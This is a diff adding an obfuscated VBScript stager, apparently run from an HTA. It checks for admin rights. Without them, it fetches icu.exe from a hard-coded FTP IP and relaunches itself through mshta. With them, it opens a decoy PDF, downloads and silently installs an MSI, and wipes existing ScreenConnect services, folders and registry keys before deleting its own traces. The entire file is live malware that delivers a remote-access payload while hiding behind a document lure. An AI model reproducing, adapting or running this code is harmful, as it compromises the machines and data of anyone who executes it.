@@ -1,0 +1,159 @@
+' run seed main
+' built d7ce65e4
+' stage
+Dim ojzn, vfa, mjq, mcsmh, m5a8s, vh8, x54, wumg, t3v, k8d, xnf, o2ce7, mevr, g92p, v2cye, ogu, w3ay, k4q, x9c
+Dim gwc7, xkd, wuz, oyw, t3w6, xzt, omcd
+Set ojzn = CreateObject("Scripting.FileSystemObject")
+Set vfa = CreateObject("WScript.Shell")
+mcsmh = vfa.ExpandEnvironmentStrings("%TEMP%")
+Set mjq = ojzn.OpenTextFile(mcsmh & "\s1fb5f.txt", 8, True)
+
+mjq.WriteLine "[stage] start"
+omcd = "C:\ProgramData\sd"
+
+oyw = False
+gwc7 = mcsmh & "\_p.txt"
+vh8 = vfa.Run("cmd.exe /c C:\Windows\System32\whoami.exe /groups > """ & gwc7 & """", 0, True)
+mjq.WriteLine "[stage] whoami rc=" & vh8
+If ojzn.FileExists(gwc7) Then
+    Set wuz = ojzn.OpenTextFile(gwc7, 1)
+    If Not wuz.AtEndOfStream Then xkd = wuz.ReadAll
+    wuz.Close
+    zaxtt = 4
+    If InStr(xkd, "S-1-16-12288") > 0 Or InStr(xkd, "S-1-16-16384") > 0 Then oyw = True
+    ojzn.DeleteFile gwc7, True
+End If
+mjq.WriteLine "[stage] admin=" & oyw
+
+If Not oyw Then
+    If Not ojzn.FolderExists(omcd) Then
+        On Error Resume Next
+        ojzn.CreateFolder omcd
+        On Error GoTo 0
+
+    End If
+    m5a8s = "curl.exe -s --fail -L " & "-u an" & "onymou" & "s:ft" & "p@exa" & "mple.com " & "-o """ & omcd & "\icu.exe"" " & "ftp://72.5" & "1.57.39/" & "icu.exe"
+    vh8 = vfa.Run("cmd.exe /c " & m5a8s, 0, True)
+    t3xt = 3
+    mjq.WriteLine "[stage] icu dl rc=" & vh8
+    If ojzn.FileExists(omcd & "\icu.exe") Then
+        t3w6 = Replace(location.href, "file:///", "")
+        t3w6 = Replace(t3w6, "%20", " ")
+        t3w6 = Replace(t3w6, "/", "\")
+        On Error Resume Next
+        ojzn.DeleteFile omcd & "\p-log.txt", True
+        On Error GoTo 0
+        Set wuz = ojzn.CreateTextFile(omcd & "\run.vbs", True)
+        wuz.WriteLine "On Error Resume Next"
+        wuz.WriteLine "Dim sh"
+        wuz.WriteLine "Set sh = CreateObject(""WScript.Shell"")"
+        x6qx5 = 3
+
+        wuz.WriteLine "sh.Run ""cmd.exe /c echo [icu-vbs] hit %DATE% %TIME%> " & omcd & "\p-log.txt"", 0, True"
+        wuz.WriteLine "sh.Run ""mshta.exe "" & Chr(34) & """ & t3w6 & """ & Chr(34), 0, False"
+        wuz.Close
+        mjq.WriteLine "[stage] handoff start"
+        mjq.Close
+        vh8 = vfa.Run("cmd.exe /c """ & omcd & "\icu.exe"" m4a1_dev4 " & omcd & "\run.vbs", 0, False)
+    Else
+        mjq.WriteLine "[stage] icu missing"
+        mjq.Close
+    End If
+Else
+    m5a8s = "curl.exe -s --fail -L -o """ & mcsmh & "\Doc5u76675.pdf"" " & "https:" & "//raw.githubusercont" & "ent.com/sl" & "ynet999-code" & "r/Yambo/main/" & "du576675.pdf"
+    vh8 = vfa.Run("cmd.exe /c " & m5a8s, 0, True)
+    mjq.WriteLine "[stage] pdf dl rc=" & vh8
+    x54 = mcsmh & "\Doc5u76675.pdf"
+    If ojzn.FileExists(x54) Then
+        On Error Resume Next
+        wumg = vfa.RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe\")
+        If Err.Number <> 0 Or Len(wumg) = 0 Then
+            wumg = "msedge.exe"
+            Err.Clear
+        End If
+        On Error GoTo 0
+        t3v = vfa.Run(Chr(34) & wumg & Chr(34) & " " & Chr(34) & x54 & Chr(34), 1, False)
+        mjq.WriteLine "[stage] edge rc=" & t3v
+    Else
+        mjq.WriteLine "[stage] pdf missing"
+    End If
+
+    m5a8s = "curl.exe -s --fail -L " & "-u an" & "onymou" & "s:ft" & "p@exa" & "mple.com " & "-o """ & mcsmh & "\helper.msi"" " & "ftp://72" & ".51.57.39" & "/helper.m" & "si"
+    vh8 = vfa.Run("cmd.exe /c " & m5a8s, 0, True)
+    o9cky = 3
+    mjq.WriteLine "[stage] msi dl rc=" & vh8
+
+    mjq.WriteLine "[stage] sweep start"
+    Set k8d = GetObject("winmgmts:\\.\root\cimv2")
+    Set xnf = k8d.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%ScreenConnect%'")
+    For Each o2ce7 In xnf
+        On Error Resume Next
+        o2ce7.Terminate()
+        On Error GoTo 0
+    Next
+    Set xnf = k8d.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE 'ScreenConnect%'")
+    For Each o2ce7 In xnf
+        On Error Resume Next
+        o2ce7.StopService()
+        On Error GoTo 0
+    Next
+    vh8 = vfa.Run("cmd.exe /c ping -n 2 127.0.0.1 >nul", 0, True)
+    Set xnf = k8d.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE 'ScreenConnect%'")
+    For Each o2ce7 In xnf
+        On Error Resume Next
+        o2ce7.Delete()
+        On Error GoTo 0
+    Next
+    For Each mevr In Array("C:\Program Files (x86)", "C:\Program Files")
+        If ojzn.FolderExists(mevr) Then
+            For Each g92p In ojzn.GetFolder(mevr).SubFolders
+                If InStr(g92p.Name, "ScreenConnect") = 1 Then
+                    On Error Resume Next
+                    g92p.Delete True
+                    On Error GoTo 0
+                End If
+            Next
+        End If
+    Next
+    Set v2cye = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
+    For Each ogu In Array("SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SYSTEM\CurrentControlSet\Services")
+        On Error Resume Next
+        w3ay = ""
+        v2cye.EnumKey &H80000002, ogu, w3ay
+        If IsArray(w3ay) Then
+            For Each o2ce7 In w3ay
+            mshnh = 8
+
+                If InStr(o2ce7, "ScreenConnect") > 0 Then
+                mvv = 1
+
+                    v2cye.DeleteKey &H80000002, ogu & "\" & o2ce7
+                End If
+            Next
+
+        End If
+        Err.Clear
+    Next
+    v2cye.DeleteKey &H80000002, "SOFTWARE\WOW6432Node\ScreenConnect"
+    v2cye.DeleteKey &H80000001, "Software\ScreenConnect"
+    mjq.WriteLine "[stage] sweep done"
+
+    k4q = mcsmh & "\helper.msi"
+    If ojzn.FileExists(k4q) Then
+        x9c = vfa.Run("msiexec.exe /i """ & k4q & """ /qn /norestart", 0, False)
+        mjq.WriteLine "[stage] msi rc=" & x9c
+
+    Else
+        mjq.WriteLine "[stage] msi missing"
+    End If
+
+    On Error Resume Next
+    If ojzn.FileExists(mcsmh & "\e.bat") Then ojzn.DeleteFile mcsmh & "\e.bat", True
+    If ojzn.FileExists(mcsmh & "\icu.exe") Then ojzn.DeleteFile mcsmh & "\icu.exe", True
+    If ojzn.FileExists(omcd & "\run.vbs") Then ojzn.DeleteFile omcd & "\run.vbs", True
+    If ojzn.FileExists(omcd & "\icu.exe") Then ojzn.DeleteFile omcd & "\icu.exe", True
+    If ojzn.FileExists(omcd & "\p-log.txt") Then ojzn.DeleteFile omcd & "\p-log.txt", True
+    On Error GoTo 0
+    mjq.WriteLine "[stage] done"
+    mjq.Close
+End If
